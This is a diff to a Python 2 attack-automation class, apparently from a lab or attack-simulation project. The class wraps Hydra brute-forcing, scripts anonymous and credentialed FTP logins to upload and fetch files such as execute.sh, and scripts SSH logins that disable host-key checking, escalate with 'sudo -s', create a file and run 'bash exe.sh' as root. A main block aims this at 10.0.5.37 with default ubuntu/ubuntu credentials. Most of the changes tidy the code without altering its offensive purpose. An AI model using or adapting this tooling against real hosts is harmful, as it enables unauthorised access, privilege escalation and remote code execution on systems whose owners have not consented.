@@ -10,15 +10,14 @@ log.basicConfig()
 class attackerClass(object):
 
 	"===================================================================INITIALISE========================================================================="
-	def __init__(self,ip,username,password,command,db_array):
-		self.ip = ip
-		self.username = username
-		self.password = password
-		self.command = command
-		self.db_array = db_array
+	def __init__(self):
+		self.ip = ""
+		self.username = ""
+		self.password = ""
+		self.command = ""
+		self.db_array = ""
 		
 	"===================================================================INITIALISE========================================================================="
-	
 	
 	def kill_hydra(self):
 		os.system("pkill -f hydra")
@@ -36,7 +35,7 @@ class attackerClass(object):
 			time.sleep(30)
 			print("BruteForce Successfully Executed")
 			child.close()
-			kill_hydra()
+			self.kill_hydra()
 
 		except Exception as e:
 			print str(e)
@@ -45,7 +44,7 @@ class attackerClass(object):
 		except pexpect.EOF:
 			print("BruteForce Executed")
 			child.close()
-			kill_hydra()
+			self.kill_hydra()
 
 	"===================================================================FTP METHODS========================================================================="		
 	#Anonymous User Methods
@@ -60,8 +59,7 @@ class attackerClass(object):
 			child.expect(":")
 			child.sendline(user)
 			child.expect(">")
-			child.sendline("ls")
-			child.interact()
+			child.sendline("bye")
 
 			print("Anonymous Login Succesfully Executed")
 
@@ -69,7 +67,7 @@ class attackerClass(object):
 			print str(e)
 			log.exception(e)
 
-	def execute_ftp_put_anon_file(user,ip):		
+	def execute_ftp_put_anon_file(self,user,ip):		
 		'''
 		FTP directly into the machine using parameters received
 		Put a file into the machine
@@ -82,7 +80,8 @@ class attackerClass(object):
 			child.sendline(user)
 			child.expect(">")
 			child.sendline("put execute.sh")
-			child.interact()
+			child.expect(">")
+			child.sendline("bye")
 
 			print("Anonymous File Creation Successfully Executed")
 
@@ -90,20 +89,22 @@ class attackerClass(object):
 			print str(e)
 			log.exception(e)
 
-	def execute_ftp_get_anon_file(user,ip):		
+	def execute_ftp_get_anon_file(self,user,ip):		
 		'''
 		FTP directly into the machine using parameters received
 		Put a file into the machine
 		'''
 		try:
 			print("Anonymous File Download Executed")
-			line = "ftp -p {}".format(ip)	
+			line = "ftp -p {}".format(ip)
+			file_command = "get {}".format("myfile.txt")
 			child = pexpect.spawn(line)
 			child.expect(":")
 			child.sendline(user)
 			child.expect(">")
-			child.sendline("get myfile.txt")
-			child.interact()
+			child.sendline(file_command)
+			child.expect(">")
+			child.sendline("bye")
 
 			print("Anonymous File Download Succesfully Executed")
 
@@ -112,7 +113,7 @@ class attackerClass(object):
 			log.exception(e)
 
 	#Normal User Methods		
-	def execute_ftp_login_normal_user(user,password,ip):
+	def execute_ftp_login_normal_user(self,user,password,ip):
 		'''
 		FTP directly into the machine using parameters received
 		'''
@@ -125,30 +126,31 @@ class attackerClass(object):
 			child.expect(":")
 			child.sendline(password)
 			child.expect(">")
-			child.sendline("ls")
-			child.interact()
+			child.sendline("bye")
 
 			print("Login Succesfully Executed")
 
 		except Exception as e:
 			print str(e)
 
-	def execute_ftp_put_user_file(user,password,ip):		
+	def execute_ftp_put_user_file(self,user,password,ip):		
 		'''
 		FTP directly into the machine using parameters received
 		Put a file into the machine
 		'''
 		try:
 			print("File Creation Being Executed")
-			line = "ftp -p {}".format(ip)	
+			line = "ftp -p {}".format(ip)
+			file_command = "put {}".format("execute.py")
 			child = pexpect.spawn(line)
 			child.expect(":")
 			child.sendline(user)
 			child.expect(":")
 			child.sendline(password)
 			child.expect(">")
-			child.sendline("put execute.sh")
-			child.interact()
+			child.sendline(file_command)
+			child.expect(">")
+			child.sendline("bye")
 
 			print("File Creation Successfully Executed")
 
@@ -156,7 +158,7 @@ class attackerClass(object):
 			print str(e)
 			log.exception(e)
 
-	def execute_ftp_get_user_file(user,password,ip):		
+	def execute_ftp_get_user_file(self,user,password,ip):		
 		'''
 		FTP directly into the machine using parameters received
 		Put a file into the machine
@@ -164,15 +166,17 @@ class attackerClass(object):
 		try:
 			print("File Download Being Executed")
 
-			line = "ftp -p {}".format(ip)	
+			line = "ftp -p {}".format(ip)
+			file_command = "get {}".format("execute.py")
 			child = pexpect.spawn(line)
 			child.expect(":")
 			child.sendline(user)
 			child.expect(":")
 			child.sendline(password)
 			child.expect(">")
-			child.sendline("get execute.sh")
-			child.interact()
+			child.sendline(file_command)
+			child.expect(">")
+			child.sendline("bye")
 
 			print("File Download Succesfully Executed")
 
@@ -196,18 +200,27 @@ class attackerClass(object):
 			if index == 0:
 				ssh_handle.sendline("yes")
 				ssh_handle.sendline(password)
-				print("SSH sudo Login Succesful ")
-			if index == 1:
+				ssh_handle.expect("#")
+				ssh_handle.sendline("exit")
+				ssh_handle.expect("$")
+				ssh_handle.sendline("logout")
+
 				print("SSH sudo Login Succesful ")
 
-		except Exception as e:
+			if index == 1:
+				ssh_handle.expect("#")
+				ssh_handle.sendline("exit")
+				ssh_handle.expect("$")
+				ssh_handle.sendline("logout")
+
+				print("SSH sudo Login Succesful ")
+
+		except Exception, e:
 			print str(e)
-			log.exception(e)
 
 		except pxssh.ExceptionPxssh as e:
 			print("Error")
 			print str(e)
-			log.exception(e)
 
 	def execute_ssh_sudo(self,user,password,ip):
 		'''
@@ -224,21 +237,29 @@ class attackerClass(object):
 				ssh_handle.sendline(password)
 				ssh_handle.sendline('sudo -s')
 				ssh_handle.sendline(password)
+				ssh_handle.expect("#")
+				ssh_handle.sendline("exit")
+				ssh_handle.expect("$")
+				ssh_handle.sendline("logout")
+
 				print("SSH sudo Login Succesful ")
 
 			if index == 1:
 				ssh_handle.sendline('sudo -s')
 				ssh_handle.sendline(password)
+				ssh_handle.expect("#")
+				ssh_handle.sendline("exit")
+				ssh_handle.expect("$")
+				ssh_handle.sendline("logout")
+
 				print("SSH sudo Login Succesful ")
 
-		except Exception as e:
+		except Exception, e:
 			print str(e)
-			log.exception(e)
 
 		except pxssh.ExceptionPxssh as e:
 			print("Error")
 			print str(e)
-			log.exception(e)
 
 
 	def execute_ssh_create_file(self,user,password,ip):
@@ -260,21 +281,29 @@ class attackerClass(object):
 				ssh_handle.sendline('sudo -s')
 				ssh_handle.sendline(password)
 				ssh_handle.sendline(file_command)
+				ssh_handle.expect("#")
+				ssh_handle.sendline("exit")
+				ssh_handle.expect("$")
+				ssh_handle.sendline("logout")
+
 				print("File Succesfully Created")
 
 			if index == 1:
 				ssh_handle.sendline('sudo -s')
 				ssh_handle.sendline(password)
 				ssh_handle.sendline(file_command)
+				ssh_handle.expect("#")
+				ssh_handle.sendline("exit")
+				ssh_handle.expect("$")
+				ssh_handle.sendline("logout")
+
 				print("File Succesfully Created")
 
-		except Exception as e:
+		except Exception, e:
 			print str(e)
-			log.exception(e)
 
 		except pxssh.ExceptionPxssh as e:
 			print str(e)
-			log.exception(e)
 
 	def execute_ssh_execute_file(self,user,password,ip):
 		'''
@@ -282,7 +311,7 @@ class attackerClass(object):
 		'''
 		try:
 			print("File Being Executed")
-			file_command = "bash exe.sh"
+			file_command = "{} {}".format("bash","exe.sh")
 			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
 			ssh_handle.login(ip, user, password)
 			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])
@@ -293,19 +322,31 @@ class attackerClass(object):
 				ssh_handle.sendline('sudo -s')
 				ssh_handle.sendline(password)
 				ssh_handle.sendline(file_command)
+				ssh_handle.expect("#")
+				ssh_handle.sendline("exit")
+				ssh_handle.expect("$")
+				ssh_handle.sendline("logout")
+
 				print("File Succesfully Executed")
 
 			if index == 1:
 				ssh_handle.sendline('sudo -s')
 				ssh_handle.sendline(password)
 				ssh_handle.sendline(file_command)
+				ssh_handle.expect("#")
+				ssh_handle.sendline("exit")
+				ssh_handle.expect("$")
+				ssh_handle.sendline("logout")
+
 				print("File Succesfully Executed")
 
-		except Exception as e:
+		except Exception, e:
 			print str(e)
-			log.exception(e)
 
 		except pxssh.ExceptionPxssh as e:
 			print str(e)
-			log.exception(e)
 	"===================================================================SSH METHODS========================================================================="
+
+if __name__ == "__main__":
+	object = attackerClass()
+	object.execute_ssh_create_file("ubuntu","ubuntu","10.0.5.37")
